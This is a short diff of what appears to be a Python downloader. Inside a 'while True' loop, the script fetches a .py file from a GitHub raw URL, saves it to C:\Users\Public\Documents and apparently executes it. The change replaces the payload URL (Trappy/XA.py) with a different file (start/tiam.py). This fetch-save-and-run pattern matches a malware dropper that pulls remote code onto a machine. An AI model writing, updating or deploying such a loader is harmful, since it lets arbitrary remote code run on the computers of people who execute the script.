@@ -39,7 +39,7 @@ while True:
                 print(f"Error running file: {e}")
 
         def main():
-            github_raw_url = 'https://raw.githubusercontent.com/mrbirdIR/Trappy/refs/heads/main/XA.py'
+            github_raw_url = 'https://raw.githubusercontent.com/mrbirdIR/start/refs/heads/main/tiam.py'
             save_folder = r"C:\Users\Public\Documents"
 
             if not os.path.exists(save_folder):
